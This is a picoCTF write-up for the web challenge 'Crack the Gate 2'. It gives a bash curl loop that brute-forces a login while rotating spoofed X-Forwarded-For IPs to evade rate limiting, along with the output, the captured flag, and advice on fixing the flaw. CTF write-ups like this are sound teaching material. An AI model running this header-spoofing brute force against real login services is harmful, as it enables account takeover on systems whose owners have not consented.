# Crack the Gate 2 — picoCTF Writeup

## Challenge Info

| Field       | Details                                        |
|-------------|------------------------------------------------|
| Name        | Crack the Gate 2                               |
| Category    | Web Exploitation                               |
| Platform    | picoCTF                                        |
| URL         | `http://amiable-citadel.picoctf.net:51043/`    |

**Description:**
The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We've received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: `ctf-player@picoctf.org` and uncover the hidden secret.

---

## Solution

### Step 1: Download the Password List

The challenge provides a password list with 19 entries:

```bash
curl -s -o passwords.txt https://challenge-files.picoctf.net/.../passwords.txt
wc -l passwords.txt
# 19 passwords.txt
```

Only 19 passwords — a small list. The challenge isn't about finding the password, it's about bypassing the rate limiter.

---

### Step 2: Understand the Rate Limiting

If we try to brute force normally, the server will block us after a few failed attempts because all requests come from the same IP. The challenge hint says:

> "the system might still trust user-controlled headers"

This points to the **X-Forwarded-For** header — a standard HTTP header used by proxies and load balancers to pass the client's original IP address. If the rate limiter checks this header instead of the actual connection IP, we can spoof different IPs to avoid getting locked out.

---

### Step 3: Brute Force with X-Forwarded-For Rotation

We send each login attempt with a different `X-Forwarded-For` IP so the rate limiter treats each request as coming from a unique client:

```bash
i=1
while IFS= read -r pass; do
  result=$(curl -s -X POST http://amiable-citadel.picoctf.net:51043/login \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d "{\"email\":\"ctf-player@picoctf.org\",\"password\":\"$pass\"}")
  echo "[$i] $pass: $result"

  flag=$(echo "$result" | grep -o 'picoCTF{[^}]*}')
  if [ -n "$flag" ]; then
    echo "FLAG FOUND: $flag"
    break
  fi
  i=$((i+1))
done < passwords.txt
```

Each request uses a different spoofed IP (`10.0.0.1`, `10.0.0.2`, `10.0.0.3`, ...), so the rate limiter never triggers.

**Result:**

```
[1]  tKzytEv9: {"success":false}
[2]  gcMwJJ4z: {"success":false}
...
[18] lGlNYYkO: {"success":false}
[19] axTtBLvc: {"success":true, ..., "flag":"picoCTF{xff_byp4ss_brut3_3b2dc94d}"}
FLAG FOUND: picoCTF{xff_byp4ss_brut3_3b2dc94d}
```

The correct password is `axTtBLvc` (the last one in the list).

---

## Flag

```
picoCTF{xff_byp4ss_brut3_3b2dc94d}
```

---

## Key Takeaways

1. **Never trust user-controlled headers for security decisions.** The `X-Forwarded-For` header is set by the client and can be easily spoofed. If a rate limiter relies on this header to identify clients, an attacker can bypass it by sending a different IP with each request.

2. **How X-Forwarded-For works:**
   - When a request passes through a proxy or load balancer, the proxy adds the client's real IP to the `X-Forwarded-For` header
   - Format: `X-Forwarded-For: client_ip, proxy1_ip, proxy2_ip`
   - The problem: anyone can set this header directly, pretending to be behind a proxy
   - The fix: use the actual TCP connection IP (`req.socket.remoteAddress`) or only trust `X-Forwarded-For` from known proxy IPs

3. **Rate limiting must use reliable identifiers.** Effective rate limiting should be based on:
   - The actual connection IP (not a header)
   - Authenticated user identity (session/token)
   - A combination of multiple signals
   - Server-side counters that cannot be influenced by client headers

4. **The flag name says it all.** `xff_byp4ss_brut3` — X-Forwarded-For bypass + brute force. A classic attack pattern against poorly implemented rate limiters.
